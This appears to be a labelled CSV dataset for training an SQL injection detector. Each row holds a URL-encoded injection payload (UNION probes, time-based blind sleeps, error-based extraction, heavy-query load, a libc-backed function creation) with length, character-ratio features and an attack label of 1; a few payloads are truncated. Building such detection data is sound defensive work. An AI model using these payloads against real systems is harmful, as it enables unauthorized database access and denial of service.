payload,payload_len,alpha,non_alpha,attack_feature,label
1%29%20as%20nkjo%20where%208462%3D8462%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,90,86.66666666666667,13.333333333333334,90000.0,1
-2790%27%29%20as%20xhct%20where%205756%3D5756%20union%20all%20select%205756%2C5756%23,59,89.83050847457628,10.16949152542373,90000.0,1
1%22%29%29%29%20and%20%28select%209067%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289067%3D9067%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%28%28%22blkt%22%20like%20%22blkt,201,80.59701492537313,19.402985074626866,120000.0,1
1%27%7C%7C%28select%20%27dpce%27%20from%20dual%20where%205261%3D5261%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,93,84.94623655913979,15.053763440860216,120000.0,1
1%29%29%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%28%281636%3D1636,41,78.04878048780488,21.951219512195124,60000.0,1
-4535%27%29%20union%20all%20select%208491%2C8491%2C8491%2C8491%2C8491%2C8491--,56,82.14285714285714,17.857142857142858,60000.0,1
1%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%284703%3D4703,198,75.75757575757575,24.242424242424242,60000.0,1
1%22%29%20where%202702%3D2702%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29--,96,72.91666666666666,27.083333333333332,60000.0,1
1%27%29%20where%205331%3D5331%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,51,78.43137254901961,21.568627450980394,30000.0,1
-3555%27%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%27papr%27%3D%27papr,53,75.47169811320755,24.528301886792452,60000.0,1
1%22%29%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%28%22ypoj%22%3D%22ypoj,177,80.7909604519774,19.2090395480226,90000.0,1
1%27%29%20where%201363%3D1363%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29--,125,74.4,25.6,60000.0,1
1%29%29%20as%20oqfr%20where%206426%3D6426%20and%20make_set%288403%3D8403%2C8899%29--,58,82.75862068965517,17.24137931034483,60000.0,1
1%27%20where%206359%3D6359%20and%20%283020%3D3020%29%2A6703--,41,80.48780487804879,19.51219512195122,60000.0,1
-9014%25%27%29%20union%20all%20select%204211%2C4211%2C4211%2C4211%2C4211%2C4211%23,56,82.14285714285714,17.857142857142858,60000.0,1
1%27%2B%28select%20pagd%20where%202484%3D2484%3Bselect%20%28case%20when%20%283855%3D3855%29%20then%203855%20else%201/%28select%200%29%20end%29--,96,84.375,15.625,30000.0,1
1%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,64,85.9375,14.0625,60000.0,1
1%27%29%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%27lnte%27%3D%27lnte,224,71.875,28.125,90000.0,1
-2987%22%29%20as%20iyob%20where%207827%3D7827%20or%20%288459%3D8459%29%2A4906--,53,81.13207547169812,18.867924528301888,60000.0,1
1%20waitfor%20delay%20%270%3A0%3A5%27--%20nnnp,30,80.0,20.0,30000.0,1
1%25%22%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%28%22%25%22%3D%22,90,66.66666666666666,33.33333333333333,60000.0,1
1%22%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%22ardk%22%20like%20%22ardk,211,71.56398104265402,28.436018957345972,90000.0,1
1%22%29%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%22giuq%22%3D%22giuq,83,73.49397590361446,26.506024096385545,69000.0,1
1%25%27%29%29%3Bselect%20sleep%285%29%23,22,63.63636363636363,36.36363636363637,57.14285714285715,1
1%22%20where%204281%3D4281%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,106,83.9622641509434,16.037735849056602,60000.0,1
1%22%29%29%20rlike%20%28select%20%28case%20when%20%285342%3D1036%29%20then%201%20else%200x28%20end%29%29%20and%20%28%28%22ntdz%22%20like%20%22ntdz,88,82.95454545454545,17.045454545454543,60000.0,1
-6629%25%22%29%29%29%20or%208571%3D8571--,25,64.0,36.0,30000.0,1
-9087%22%20order%20by%201%23,18,83.33333333333334,16.666666666666664,30000.0,1
1%27%29%29%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%27atvu%27%3D%27atvu,84,71.42857142857143,28.57142857142857,39000.0,1
1%27%29%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%28%28%27gydh%27%3D%27gydh,114,77.19298245614034,22.807017543859647,60000.0,1
1%25%27%29%20order%20by%201%23,16,75.0,25.0,30000.0,1
1%29%20as%20zmjm%20where%209125%3D9125%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29--,132,76.51515151515152,23.484848484848484,60000.0,1
1%22%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,46,84.78260869565217,15.217391304347828,60000.0,1
-9893%27%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%281,225,55.111111111111114,17.333333333333336,60000.0,1
-8359%29%20where%204430%3D4430%20or%206872%3D6872--,37,83.78378378378379,16.216216216216218,60000.0,1
1%22%29%20as%20lgxc%20where%201117%3D1117%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,85,87.05882352941177,12.941176470588237,90000.0,1
1%27%29%29%29%20and%20elt%289501%3D8427%2C8427%29%20and%20%28%28%28%27ahpp%27%3D%27ahpp,49,69.38775510204081,30.612244897959183,60000.0,1
1%27%29%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%27cuat%27%3D%27cuat,124,77.41935483870968,21.774193548387096,90000.0,1
1%25%27%29%29%20and%20sleep%285%29%23,19,63.1578947368421,36.84210526315789,30000.0,1
1%22%29%29%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%28%28%22qgle%22%20like%20%22qgle,183,80.87431693989072,19.12568306010929,120000.0,1
1%22%29%29%20as%20zemm%20where%203324%3D3324%20or%202367%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,135,85.92592592592592,14.074074074074074,90000.0,1
1%27%29%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29,133,89.47368421052632,10.526315789473685,11.764705882352942,1
1%22%20where%205440%3D5440%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,121,87.60330578512396,12.396694214876034,90000.0,1
1%25%27%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%27%25%27%3D%27,102,77.45098039215686,22.54901960784314,60000.0,1
1%27%29%29%20as%20kdwc%20where%205906%3D5906%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,92,84.78260869565217,15.217391304347828,90000.0,1
1%25%22%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%22%25%22%3D%22,55,70.9090909090909,29.09090909090909,90000.0,1
1%27%29%29%20as%20cbka%20where%203176%3D3176%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,89,82.02247191011236,17.97752808988764,90000.0,1
1%29%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,91,81.31868131868131,18.681318681318682,30000.0,1
1%27%29%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%27hbld%27%3D%27hbld,124,77.41935483870968,21.774193548387096,90000.0,1
1%22%29%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,47,72.3404255319149,27.659574468085108,60000.0,1
-8600%22%20or%20elt%281032%3D1032%2C3623%29%20and%20%22kfsn%22%20like%20%22kfsn,51,82.35294117647058,17.647058823529413,90000.0,1
1%27%29%29%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%28%27cfhi%27%20like%20%27cfhi,120,78.33333333333333,21.666666666666668,90000.0,1
1%27%7C%7C%28select%20%27awic%27%20where%205227%3D5227%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,66,77.27272727272727,22.727272727272727,30000.0,1
1%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%23%20urzg,146,72.6027397260274,27.397260273972602,30000.0,1
1%27%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%27wmrr%27%20like%20%27wmrr,120,85.83333333333333,14.166666666666666,120000.0,1
begin%20if%20%285624%3D5624%29%20then%20dbms_lock.sleep%285%29%3B%20else%20dbms_lock.sleep%280%29%3B%20end%20if%3B%20end%3B,83,87.95180722891565,12.048192771084345,13.698630136986312,1
1%27%20in%20boolean%20mode%29%3Bselect%20dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29%20from%20dual--,104,75.96153846153845,24.03846153846154,30000.0,1
-5052%29%29%29%20union%20all%20select%208351%2C8351%2C8351%2C8351%23,46,82.6086956521739,17.391304347826086,60000.0,1
-2397%29%29%20as%20oizy%20where%201746%3D1746%20union%20all%20select%201746%2C1746%2C1746%2C1746%2C1746%2C1746%23,79,87.34177215189874,12.658227848101266,90000.0,1
1%20where%202751%3D2751%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,56,89.28571428571429,10.714285714285714,90000.0,1
1%22%29%29%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%28%28%28%22ekbq%22%3D%22ekbq,108,81.48148148148148,18.51851851851852,60000.0,1
1%22%29%29%3Bif%287899%3D7899%29%20select%207899%20else%20drop%20function%20zbbp--,56,83.92857142857143,16.071428571428573,60000.0,1
1%25%27%29%29%29%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%28%28%27%25%27%3D%27,169,85.20710059171599,14.792899408284024,90000.0,1
-6772%22%29%29%20or%209323%3D9323%23,22,72.72727272727273,27.27272727272727,30000.0,1
1%27%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%27vgkt%27%3D%27vgkt,115,84.34782608695653,15.65217391304348,90000.0,1
1%22%29%29%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%28%28%28%22dnlz%22%3D%22dnlz,100,68.0,32.0,60000.0,1
1%27%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,68,80.88235294117648,19.11764705882353,60000.0,1
1%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,73,80.82191780821918,19.17808219178082,60000.0,1
-4707%27%20union%20all%20select%204414%2C4414%2C4414%2C4414%2C4414%2C4414%23,54,85.18518518518519,14.814814814814813,60000.0,1
-3300%27%20union%20all%20select%208979%2C8979%2C8979%2C8979%2C8979%2C8979--,55,83.63636363636363,16.363636363636363,60000.0,1
1%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29--%20nqdb,110,79.0909090909091,20.0,60000.0,1
-2500%27%29%29%29%20union%20all%20select%206853%2C6853%2C6853%2C6853--,48,79.16666666666666,20.833333333333336,60000.0,1
1%29%20as%20vqdh%20where%201603%3D1603%3Biif%284436%3D8910%2C1%2C1/0%29,47,80.85106382978722,19.148936170212767,30000.0,1
-8608%22%20or%205460%3D4461--,21,76.19047619047619,23.809523809523807,30000.0,1
1%25%22%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,35,82.85714285714286,17.14285714285714,20.689655172413786,1
-4286%25%22%29%29%29%20union%20all%20select%202229%2C2229%2C2229%2C2229%2C2229%2C2229%23,58,79.3103448275862,20.689655172413794,60000.0,1
1%22%29%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%28%22ubvd%22%3D%22ubvd,64,79.6875,20.3125,60000.0,1
1%27%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,100,85.0,15.0,30000.0,1
1%25%27%20or%20elt%286272%3D6272%2Csleep%285%29%29%20and%20%27%25%27%3D%27,40,67.5,32.5,60000.0,1
elt%285953%3D5953%2C1%29,16,87.5,12.5,14.285714285714285,1
1%22%29%29%29%20and%20elt%283114%3D3114%2Csleep%285%29%29%23,34,67.64705882352942,32.35294117647059,30000.0,1
1%25%27%29%29%20rlike%20%28select%20%28case%20when%20%286094%3D7893%29%20then%201%20else%200x28%20end%29%29%20and%20%28%28%27%25%27%3D%27,77,76.62337662337663,23.376623376623375,30000.0,1
1%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%23%20hlrg,113,87.61061946902655,12.389380530973451,60000.0,1
1%27%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%27aezm%27%20like%20%27aezm,120,84.16666666666667,15.833333333333332,120000.0,1
-8404%29%29%20order%20by%201--,20,75.0,25.0,30000.0,1
1%22%29%20and%202006%3D2006,17,82.35294117647058,17.647058823529413,30000.0,1
-6079%29%29%29%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cc,227,53.30396475770925,17.62114537444934,60000.0,1
-3499%27%29%29%29%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%,214,55.140186915887845,18.22429906542056,30000.0,1
1%27%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%27xemh%27%3D%27xemh,102,86.27450980392157,13.725490196078432,60000.0,1
-7923%22%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%28%22szct%22%3D%22szct,55,72.72727272727273,27.27272727272727,60000.0,1
1%27%29%29%29%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%20and%20%28%28%28%27etzb%27%3D%27etzb,140,80.0,20.0,90000.0,1
-1236%27%2B%28select%20%27fbgh%27%20where%203896%3D3896%20union%20all%20select%203896%2C3896%2C3896%2C3896%2C3896%2C3896%2C3896%2C3896%2C3896--,101,83.16831683168317,16.831683168316832,90000.0,1
1%27%2C%28case%20when%208260%3D8260%20then%201%20else%20null%20end%29,45,93.33333333333333,6.666666666666671,7.142857142857148,1
1%27%29%29%29%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,47,74.46808510638297,25.53191489361702,60000.0,1
1%27%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%27xmnd%27%3D%27xmnd,93,72.04301075268818,27.956989247311824,60000.0,1
1%25%22%29%29%20and%208635%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,66,75.75757575757575,24.242424242424242,60000.0,1
1%22%29%20and%20make_set%284539%3D6401%2C6401%29%20and%20%28%22kglx%22%3D%22kglx,50,76.0,24.0,60000.0,1
-5859%29%20as%20ernq%20where%208394%3D8394%20union%20all%20select%208394%2C8394%2C8394--,64,89.0625,10.9375,90000.0,1
1%27%29%29%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%28%27holo%27%3D%27holo,173,87.86127167630057,12.138728323699421,90000.0,1
1%25%27%29%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,105,79.04761904761905,20.95238095238095,26.506024096385538,1
-9078%20union%20all%20select%203779%2C3779%2C3779%2C3779%2C3779%2C3779%2C3779%2C3779--,64,84.375,15.625,60000.0,1
1%25%22%29%20or%20sleep%285%29%20and%20%28%22%25%22%3D%22,27,59.25925925925925,40.74074074074074,60000.0,1
1%27%20or%20elt%286272%3D6272%2Csleep%285%29%29,29,75.86206896551724,24.137931034482758,30000.0,1
-6095%27%29%20or%206872%3D6872%20and%20%28%27bfwm%27%20like%20%27bfwm,43,81.3953488372093,18.6046511627907,90000.0,1
1%27%7C%7C%28select%20%27xhqy%27%20where%204531%3D4531%20union%20all%20select%20null%2Cnull--,63,84.12698412698413,15.873015873015872,90000.0,1
-8465%27%20where%205242%3D5242%20or%203806%3D7423--,37,83.78378378378379,16.216216216216218,60000.0,1
1%27%29%29%29%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,106,78.30188679245283,21.698113207547166,27.710843373493972,1
1%27%20where%209381%3D9381%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual--,102,75.49019607843137,24.509803921568626,60000.0,1
1%27%29%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%28%28%27kufi%27%3D%27kufi,113,77.87610619469027,22.123893805309734,30000.0,1
-6249%27%29%29%29%20union%20all%20select%205136%2C5136%2C5136%2C5136%2C5136%2C5136%2C5136%2C5136%2C5136--,73,79.45205479452055,20.54794520547945,60000.0,1
1%25%27%29%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%28%27%25%27%3D%27,145,81.37931034482759,18.620689655172416,30000.0,1
1%2C%28select%20%28case%20when%20%283902%3D3902%29%20then%20%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20else%201/%28select%200%20from%20dual%29%20end%29%20from%20dual%29,169,85.20710059171599,14.792899408284024,90000.0,1
1%27%29%29%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%28%28%28%27brhc%27%20like%20%27brhc,72,73.61111111111111,26.38888888888889,120000.0,1
1%27%29%20and%20make_set%288403%3D8403%2C8899%29%20and%20%28%27ojag%27%3D%27ojag,50,76.0,24.0,60000.0,1
-2111%27%20union%20all%20select%201061%2C1061%2C1061--,40,85.0,15.0,60000.0,1
1%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%23%20hkrp,67,79.1044776119403,20.8955223880597,39000.0,1
1%22%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%22kbex%22%20like%20%22kbex,129,86.82170542635659,13.178294573643413,120000.0,1
1%20where%206518%3D6518%3Bselect%20benchmark%285000000%2Cmd5%280x714e4153%29%29%23,60,86.66666666666667,13.333333333333334,30000.0,1
1%22%29%20where%202215%3D2215%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29--,253,71.93675889328063,28.063241106719367,129000.0,1
